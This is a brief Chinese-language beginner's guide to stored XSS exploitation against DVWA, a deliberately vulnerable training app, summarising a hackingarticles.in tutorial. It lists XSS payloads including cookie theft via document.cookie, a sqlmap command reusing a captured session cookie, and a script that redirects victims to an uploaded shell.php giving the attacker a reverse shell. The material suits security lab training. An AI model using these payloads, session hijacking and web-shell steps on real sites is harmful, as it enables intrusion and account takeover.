## DVWA中存储的XSS开发（初学者指南）[^1]

`<script>alert(XSS)</script>`

`<script>alert(document.cookie)</script>`

### **使用XSS进行SQL注入**

`sqlmap -u "//192.168.1.8/dvwa/vulnerbilities/sqli/?id=1&submit=submit" --cookie="security=low; PHPSESSID=r12pk67cuq3s7eo4iktb88sud2" –dbs --batch`

### **使用XSS获得Shell访问**

`<script>window.location="//192.168.1.8/dvwa/hackable/upload/shell.php"</script>` [^2]

[原文](https://www.hackingarticles.in/stored-xss-exploitation-dvwa-beginner-guide/)

---

[^1]: 跨站点脚本（XSS）攻击是一种注入类型，其中恶意脚本被注入可信网站。当攻击者使用Web应用程序将恶意代码（通常以浏览器端脚本的形式）发送给不同的最终用户时，就会发生XSS攻击。最终用户的浏览器无法知道该脚本不应该被信任，并将执行该脚本。因为它认为脚本来自可靠来源，所以恶意脚本可以访问任何cookie，会话令牌或浏览器保留并与该站点一起使用的其他敏感信息。**存储型XSS**通常在用户输入存储在目标服务器上时发生，例如在数据库中，在消息论坛，访问者日志，注释字段等中。然后受害者能够从Web应用程序检索存储的数据而不是数据在浏览器中可以安全呈现。随着HTML5和其他浏览器技术的出现，我们可以设想攻击有效负载永久存储在受害者的浏览器中，例如HTML5数据库，并且永远不会被发送到服务器。
[^2]: 您可以看到我已经在脚本中注入了上传文件的路径，该路径将保存在服务器中。当用户点击它以阅读消息时，他将执行我们的shell.php文件，该文件在攻击者机器上提供反向连接。